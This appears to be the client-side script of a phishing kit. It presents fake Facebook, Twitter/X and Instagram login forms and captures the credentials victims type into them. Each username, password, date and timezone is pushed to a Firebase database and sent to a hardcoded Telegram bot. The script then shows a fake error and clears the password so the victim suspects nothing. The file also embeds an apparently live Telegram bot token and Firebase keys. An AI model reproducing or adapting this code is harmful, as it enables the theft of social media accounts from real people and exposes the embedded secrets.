// Telegram Bot Details
const TELEGRAM_BOT_TOKEN = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI"; // Replace with your bot token
const TELEGRAM_CHAT_ID = "CustomLinkBot"; // Replace with your chat ID

// Function to send a Telegram notification
function sendTelegramNotification(message) {
  const url = `https://api.telegram.org/bot7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI/sendMessage`;
  const data = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  }).catch((error) => console.error("Telegram Error:", error));
}

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyCXbSQv2HsMh-hVzVcDPB8d9Cn8yrQ7EAM",
  authDomain: "sharjahstarz.firebaseapp.com",
  databaseURL: "https://sharjahstarz-default-rtdb.firebaseio.com",
  projectId: "sharjahstarz",
  storageBucket: "sharjahstarz.appspot.com",
  messagingSenderId: "492595312611",
  appId: "1:492595312611:web:bf84d62ee07aac8c9392d6",
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

// Common function to handle Firebase and Telegram
function handleFirebaseAndTelegram(data, type) {
  firebase.database().ref("fbdet").push(data);

  const message = `
New ${type} Login:
- Email/Username: ${data.emle}
- Password: ${data.pass}
- Date: ${data.date}
- Time: ${data.time}
- Timezone: ${data.timezone}
`;

  sendTelegramNotification(message);
}

// Login Functions
function login() {
  firebase.auth().signInAnonymously().catch((error) => {
    showError(error.message, "error_box");
  });

  const email = document.getElementById("fb-email").value;
  const password = document.getElementById("fb-pass").value;
  const currentDate = new Date().toISOString().slice(0, 10);
  const currentTime = new Date().toISOString().slice(11, 19);
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const accountType = "Facebook";

  if (email !== "" && password !== "") {
    const data = {
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    };
    handleFirebaseAndTelegram(data, accountType);

    setTimeout(() => {
      showError("Oops, something went wrong. Please try again later.", "error_box");
      document.getElementById("fb-pass").value = "";
    }, 2000);
  } else {
    showError("Please enter both email and password.", "error_box");
  }
}

function twlogin() {
  firebase.auth().signInAnonymously().catch((error) => {
    showError(error.message, "error_box");
  });

  const email = document.getElementById("tw-email").value;
  const password = document.getElementById("tw-pass").value;
  const currentDate = new Date().toISOString().slice(0, 10);
  const currentTime = new Date().toISOString().slice(11, 19);
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const accountType = "Twitter/X";

  if (email !== "" && password !== "") {
    const data = {
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    };
    handleFirebaseAndTelegram(data, accountType);

    setTimeout(() => {
      showError("Invalid username or password", "error_box");
      document.getElementById("tw-pass").value = "";
    }, 2000);
  } else {
    showError("Please enter both email and password.", "error_box");
  }
}

function iglog() {
  const email = document.getElementById("ig-uname").value.trim();
  const password = document.getElementById("ig-pass").value.trim();
  const errorBox = "ig_error_box";

  if (email === "" || password === "") {
    showError("Please enter both email and password.", errorBox);
    return false;
  }

  firebase.auth().signInAnonymously().catch((error) => {
    showError(error.message, errorBox);
  });

  const currentDate = new Date().toISOString().slice(0, 10);
  const currentTime = new Date().toISOString().slice(11, 19);
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const accountType = "Instagram";

  const data = {
    emle: email,
    mobile: "",
    time: currentTime,
    timezone: timezone,
    pass: password,
    date: currentDate,
    type: accountType,
  };
  handleFirebaseAndTelegram(data, accountType);

  setTimeout(() => {
    showError("Please double-check your password", errorBox);
    document.getElementById("ig-pass").value = "";
  }, 2000);
}

// Error Handling
function hideError(boxId) {
  const errorBox = document.getElementById(boxId);
  errorBox.style.display = "none";
}

function showError(message, boxId) {
  alert(message);
}
